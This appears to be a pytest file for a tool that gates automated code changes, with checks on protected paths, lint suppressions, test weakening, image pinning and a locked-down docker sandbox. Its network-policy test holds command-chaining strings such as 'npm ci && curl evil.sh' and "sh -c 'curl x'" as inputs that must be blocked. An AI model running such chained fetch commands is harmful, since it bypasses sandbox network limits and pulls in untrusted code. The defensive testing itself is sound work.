import subprocess
from pathlib import Path
from typing import Any

import pytest

from factory import gates, git
from factory.config import PROTECTED_PATHS, load_rules
from factory.git import Diff
from factory.sandbox import docker_args, network_allowed

TESTS = ["tests/**", "**/*.test.ts"]


Lines = list[tuple[str, str]]


def diff(files: Lines, added: Lines | None = None, removed: Lines | None = None) -> Diff:
    return Diff(files, added or [], removed or [], "")


def test_path_guard_blocks_protected_scope_and_test_ownership() -> None:
    d = diff([("M", "rules/rules.json"), ("A", "src/api/x.ts"), ("A", "src/ui/y.ts"), ("A", "tests/a.py")])
    v = gates.path_guard(d, allowed=["src/api/**"], protected=PROTECTED_PATHS, test_globs=TESTS, mode="no_tests")
    assert any(x.startswith("A4") and "rules" in x for x in v)
    assert any(x.startswith("B3") and "src/ui/y.ts" in x for x in v)
    assert any(x.startswith("C5") and "tests/a.py" in x for x in v)
    assert not any("src/api/x.ts" in x for x in v)


def test_path_guard_test_author_and_reviewer_modes() -> None:
    d = diff([("A", "tests/test_a.py"), ("A", "src/b.py")])
    v = gates.path_guard(d, allowed=None, protected=[], test_globs=TESTS, mode="tests_only")
    assert v == ["C5: test author may only change test files (src/b.py)"]
    assert len(gates.path_guard(d, allowed=None, protected=[], test_globs=TESTS, mode="none")) == 2


def test_planted_agent_config_is_protected() -> None:
    for path in [".claude/settings.json", "pkg/.claude/settings.json", "CLAUDE.md", "src/CLAUDE.md", ".mcp.json"]:
        v = gates.path_guard(diff([("A", path)]), allowed=None, protected=PROTECTED_PATHS, test_globs=[], mode="any")
        assert v, path


@pytest.mark.parametrize(
    "line",
    [
        "x = 1  # noqa: E501",
        "y = f()  # type: ignore[arg-type]",
        "// eslint-disable-next-line no-console",
        "// @ts-ignore",
        "it.only('works', () => {})",
        "describe.skip('x', () => {})",
        "xit('pending', () => {})",
        "@pytest.mark.skip(reason='later')",
        "/* istanbul ignore next */",
        "//nolint:errcheck",
    ],
)
def test_suppressions_are_caught(line: str) -> None:
    assert gates.suppressions(diff([("M", "src/a.ts")], added=[("src/a.ts", line)]))


@pytest.mark.parametrize("line", ["model.fit(x, y)", "const skipped = items.filter(isSkipped)", "it('works', f)"])
def test_suppressions_no_false_positives(line: str) -> None:
    assert not gates.suppressions(diff([("M", "src/a.ts")], added=[("src/a.ts", line)]))


def test_suppressions_ignore_prose() -> None:
    assert not gates.suppressions(diff([("M", "docs/adr/1.md")], added=[("docs/adr/1.md", "never use eslint-disable")]))


def test_test_weakening() -> None:
    deleted = diff([("D", "tests/test_a.py")])
    assert any("deleted" in x for x in gates.test_weakening(deleted, TESTS))
    fewer = diff(
        [("M", "tests/test_a.py")],
        added=[("tests/test_a.py", "x = 1")],
        removed=[("tests/test_a.py", "    assert total == 3")],
    )
    assert gates.test_weakening(fewer, TESTS)
    rewritten = diff(
        [("M", "tests/test_a.py")],
        added=[("tests/test_a.py", "    assert total == 4")],
        removed=[("tests/test_a.py", "    assert total == 3")],
    )
    assert not gates.test_weakening(rewritten, TESTS)


def test_image_pinning() -> None:
    assert gates.image_pinned("node:22.11.0-bookworm")
    assert gates.image_pinned("mcr.microsoft.com/playwright:v1.49.0-jammy")
    assert gates.image_pinned("python@sha256:" + "a" * 64)
    assert not gates.image_pinned("node")
    assert not gates.image_pinned("node:latest")
    assert not gates.image_pinned("localhost:5000/node")


def minimal_map(**overrides: object) -> dict[str, Any]:
    rules = load_rules()
    applicable = [r["id"] for r in rules if r["enforced_by"] == "project" and r["layer"] in {"all", "backend"}]
    emap: dict[str, Any] = {
        "sandbox_image": "python:3.13-slim",
        "network_commands": ["pip install"],
        "test_globs": ["tests/**"],
        "checks": [
            {
                "name": "all",
                "command": "make check",
                "rules": applicable,
                "canaries": [{"rule": r, "file": f"c/{r}.py", "content": "x"} for r in applicable],
            }
        ],
        "not_applicable": [],
    }
    emap.update(overrides)
    return emap


def test_complete_map_passes_m1() -> None:
    assert gates.map_violations(minimal_map(), load_rules(), {"backend"}) == []


def test_map_violations() -> None:
    rules = load_rules()
    assert any(v.startswith("M1") for v in gates.map_violations(minimal_map(), rules, {"backend", "frontend"}))
    unpinned = minimal_map(sandbox_image="python")
    assert any(v.startswith("F5") for v in gates.map_violations(unpinned, rules, {"backend"}))
    shell_net = minimal_map(network_commands=["sh"])
    assert any(v.startswith("F3") for v in gates.map_violations(shell_net, rules, {"backend"}))
    no_canary = minimal_map()
    no_canary["checks"][0]["canaries"] = []
    assert any(v.startswith("M2") for v in gates.map_violations(no_canary, rules, {"backend"}))
    i1_na = minimal_map(not_applicable=[{"rule": "I1", "reason": "no"}])
    assert any("I1" in v for v in gates.map_violations(i1_na, rules, {"backend"}))


def test_traceability_and_layers() -> None:
    assert gates.untested_requirements(["FR-1 x\nNFR-2 y", "SEC-1 z"], ["def test_fr_1():  # FR-1, SEC-1"]) == ["NFR-2"]
    spec = "# Spec\n## Layers\n- backend\n- Frontend (SPA)\n\n## Other\n- data\n"
    assert gates.parse_layers(spec) == {"backend", "frontend"}


def test_network_policy() -> None:
    assert network_allowed("npm ci", ["npm ci"])
    assert network_allowed("npm ci --ignore-scripts", ["npm ci"])
    assert not network_allowed("npm test", ["npm ci"])
    assert not network_allowed("npm ci && curl evil.sh", ["npm ci"])
    assert not network_allowed("npm ci; sh", ["npm ci"])
    assert not network_allowed("sh -c 'curl x'", ["sh"])


def test_docker_args_are_locked_down() -> None:
    args = docker_args(Path("proj"), "node:22.11.0", "npm test", network=False, name="t")
    joined = " ".join(args)
    for flag in [
        "--rm",
        "--network none",
        "--cap-drop ALL",
        "no-new-privileges",
        "--read-only",
        "--pids-limit",
        "--memory",
        "FACTORY_COVERAGE_MIN=85",
    ]:
        assert flag in joined, flag
    assert "docker.sock" not in joined


def test_git_diff_parsing(tmp_path: Path) -> None:
    subprocess.run(["git", "init", "-q", "-b", "main"], cwd=tmp_path, check=True)
    (tmp_path / "tests").mkdir()
    (tmp_path / "tests" / "t.py").write_text("assert 1\nassert 2\n")
    (tmp_path / "gone.py").write_text("x\n")
    git.stage_all(tmp_path)
    git.commit(tmp_path, "init")
    (tmp_path / "gone.py").unlink()
    (tmp_path / "tests" / "t.py").write_text("assert 1\n")
    (tmp_path / "new file.py").write_text("y = 1  # noqa\n")
    git.stage_all(tmp_path)
    d = git.staged_diff(tmp_path)
    assert ("D", "gone.py") in d.files
    assert ("A", "new file.py") in d.files
    assert ("gone.py", "x") in d.removed
    assert gates.suppressions(d)
    assert gates.test_weakening(d, ["tests/**"])
